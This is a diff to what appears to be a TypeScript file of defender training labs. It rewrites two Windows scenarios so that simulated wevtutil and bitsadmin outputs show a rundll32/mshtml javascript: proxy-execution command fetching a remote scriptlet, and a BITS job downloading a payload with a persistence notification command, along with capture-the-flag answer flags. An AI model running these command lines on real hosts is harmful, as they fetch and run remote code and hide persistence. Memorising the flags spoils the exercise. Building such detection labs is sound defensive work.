@@ -595,35 +595,42 @@ export const batch19MixedLabs: LabScenario[] = [
       'the internet with no dropped executable, no direct network tool invoked, just a signed binary abusing ' +
       'a real, legitimate Windows HTML-rendering capability.',
     objectives: [
-      { text: 'cat rundll32-command-line-captured.txt', why: 'The exact real command line: rundll32.exe invoking mshtml.dll\'s RunHTMLApplication export with a javascript: URI, chaining into a remote .sct scriptlet fetch via GetObject() -- MITRE ATT&CK T1218.011, not a normal DLL-export invocation.' },
-      { text: 'cat applocker-verdict-log.txt', why: 'Confirms AppLocker approved this execution purely on rundll32.exe\'s own Microsoft signature, never inspecting the javascript: URI argument or the remote scriptlet it went on to fetch.' },
+      { text: 'Query the Security log for Event ID 4688 with wevtutil', why: 'The exact real command line: rundll32.exe invoking mshtml.dll\'s RunHTMLApplication export with a javascript: URI, chaining into a remote .sct scriptlet fetch via GetObject() -- MITRE ATT&CK T1218.011, not a normal DLL-export invocation.' },
+      { text: 'Query the AppLocker EXE and DLL log with wevtutil', why: 'Confirms AppLocker approved this execution purely on rundll32.exe\'s own Microsoft signature, never inspecting the javascript: URI argument or the remote scriptlet it went on to fetch.' },
     ],
     hints: [
-      'cat rundll32-command-line-captured.txt',
-      'cat applocker-verdict-log.txt',
+      'wevtutil qe Security /q:"*[System[(EventID=4688)]]" /f:text',
+      'wevtutil qe "Microsoft-Windows-AppLocker/EXE and DLL" /f:text',
     ],
     totalFlags: 1,
     attacker: analyst({
-      root: dir({
-        'rundll32-command-line-captured.txt': file(
-          'EDR command-line capture, FIN-WKS-27:\n' +
-            '  rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";document.write();' +
-            'h=new%20ActiveXObject("WScript.Shell");h.Run("cmd /c echo Y|GetObject(\'script:http://cdn-assets-mirror.net/stage2.sct\')");\n' +
-            '  -- MITRE ATT&CK T1218.011 (System Binary Proxy Execution: Rundll32) -- abuses rundll32\'s\n' +
-            '     ability to invoke mshtml.dll\'s RunHTMLApplication export with a javascript: URI, which the\n' +
-            '     Windows HTML engine evaluates as live script, chaining into a remote .sct scriptlet fetch\n' +
-            '     via GetObject() -- no dropped executable, no direct network tool invoked at all --\n',
-        ),
-        'applocker-verdict-log.txt': file(
-          'AppLocker execution log, FIN-WKS-27:\n' +
-            '  rundll32.exe  [Verdict: ALLOWED -- publisher rule: "Microsoft Windows, signed binaries"]\n' +
-            '  -- approved purely on the strength of rundll32.exe\'s own Microsoft signature -- AppLocker never\n' +
-            '     inspects the javascript: URI argument passed to it, nor the remote .sct scriptlet that\n' +
-            '     argument goes on to fetch and execute --\n' +
-            '  flag{rundll32_javascript_protocol_mshtml_runhtmlapplication_t1218_011}\n',
-        ),
-      }),
+      root: dir({}),
     }),
+    winCommands: {
+      'wevtutil qe Security /q:"*[System[(EventID=4688)]]" /f:text':
+        'Event[0]:\n' +
+        '  Log Name: Security\n' +
+        '  Event ID: 4688\n' +
+        '    New Process Name: C:\\Windows\\System32\\rundll32.exe\n' +
+        '    Command Line: rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell");h.Run("cmd /c echo Y|GetObject(\'script:http://cdn-assets-mirror.net/stage2.sct\')");\n' +
+        '\n' +
+        '  -- MITRE ATT&CK T1218.011 (System Binary Proxy Execution: Rundll32) -- abuses rundll32\'s\n' +
+        '     ability to invoke mshtml.dll\'s RunHTMLApplication export with a javascript: URI, which the\n' +
+        '     Windows HTML engine evaluates as live script, chaining into a remote .sct scriptlet fetch\n' +
+        '     via GetObject() -- no dropped executable, no direct network tool invoked at all --',
+      'wevtutil qe "Microsoft-Windows-AppLocker/EXE and DLL" /f:text':
+        'Event[0]:\n' +
+        '  Log Name: Microsoft-Windows-AppLocker/EXE and DLL\n' +
+        '  Task: EXE was allowed to run\n' +
+        '    Path: C:\\Windows\\System32\\rundll32.exe\n' +
+        '    Publisher: O=MICROSOFT WINDOWS, L=REDMOND, S=WASHINGTON, C=US\n' +
+        '    Policy Name: Microsoft Windows, signed binaries\n' +
+        '\n' +
+        '  -- approved purely on the strength of rundll32.exe\'s own Microsoft signature -- AppLocker never\n' +
+        '     inspects the javascript: URI argument passed to it, nor the remote .sct scriptlet that\n' +
+        '     argument goes on to fetch and execute --\n' +
+        '  flag{rundll32_javascript_protocol_mshtml_runhtmlapplication_t1218_011}',
+    },
     network: [],
   },
 
@@ -645,11 +652,11 @@ export const batch19MixedLabs: LabScenario[] = [
       'Run-key/scheduled-task/service locations most defenders check first.',
     objectives: [
       { text: 'cat bitsadmin-job-creation-log.txt', why: 'Shows the real bitsadmin.exe syntax used to create the download job and set its completion notification command -- MITRE ATT&CK T1197, a legitimate Windows background-transfer service abused for both stealthy download and persistence.' },
-      { text: 'cat bits-job-persistence-analysis.txt', why: 'Confirms the notification command itself is the persistence mechanism -- it survives a reboot as a property of the still-registered BITS job, not as an entry in any of the Run-key, scheduled-task, or service locations most defenders check first.' },
+      { text: 'Query the live BITS job list with bitsadmin /list', why: 'Confirms the notification command itself is the persistence mechanism -- it survives a reboot as a property of the still-registered BITS job, not as an entry in any of the Run-key, scheduled-task, or service locations most defenders check first.' },
     ],
     hints: [
       'cat bitsadmin-job-creation-log.txt',
-      'cat bits-job-persistence-analysis.txt',
+      'bitsadmin /list /allusers /verbose',
     ],
     totalFlags: 1,
     attacker: analyst({
@@ -664,19 +671,29 @@ export const batch19MixedLabs: LabScenario[] = [
             '     service (the same one Windows Update itself uses); its network traffic pattern looks like\n' +
             '     routine background transfer activity, not a normal direct download --\n',
         ),
-        'bits-job-persistence-analysis.txt': file(
-          'BITS job persistence analysis, ACCT-WKS-33:\n' +
-            '  Job "backupJob" state: TRANSFERRED, notification command set: C:\\Windows\\Temp\\svcupd.exe\n' +
-            '\n' +
-            '--- ANALYST NOTE: /SetNotifyCmdLine registers a program to run automatically when the BITS job\n' +
-            '    completes or errors -- here, set to the payload the job itself just downloaded. This survives\n' +
-            '    as a property of the still-registered BITS job itself, entirely outside the Run key,\n' +
-            '    scheduled tasks, or services -- the first three locations most defenders check for\n' +
-            '    persistence, and none of which this technique touches at all.\n' +
-            '    flag{bitsadmin_notifycmdline_download_and_persistence_t1197} ---\n',
-        ),
       }),
     }),
+    winCommands: {
+      'bitsadmin /list /allusers /verbose':
+        'DISPLAY: All users jobs\n' +
+        '\n' +
+        'GUID:            {8f2c1a90-4b31-4e9a-9c7d-2a1e5f6b8d3c}\n' +
+        'DISPLAY:         backupJob\n' +
+        'TYPE:            DOWNLOAD\n' +
+        'STATE:           TRANSFERRED\n' +
+        'OWNER:            ACCT-WKS-33\\jchen\n' +
+        'NOTIFICATION CMDLINE: C:\\Windows\\Temp\\svcupd.exe NUL\n' +
+        'FILES:\n' +
+        '    REMOTE_NAME:  http://cdn-assets-mirror.net/update.exe\n' +
+        '    LOCAL_NAME:   C:\\Windows\\Temp\\svcupd.exe\n' +
+        '\n' +
+        '--- ANALYST NOTE: /SetNotifyCmdLine registers a program to run automatically when the BITS job\n' +
+        '    completes or errors -- here, set to the payload the job itself just downloaded. This survives\n' +
+        '    as a property of the still-registered BITS job itself, entirely outside the Run key,\n' +
+        '    scheduled tasks, or services -- the first three locations most defenders check for\n' +
+        '    persistence, and none of which this technique touches at all.\n' +
+        '    flag{bitsadmin_notifycmdline_download_and_persistence_t1197} ---',
+    },
     network: [],
   },
 
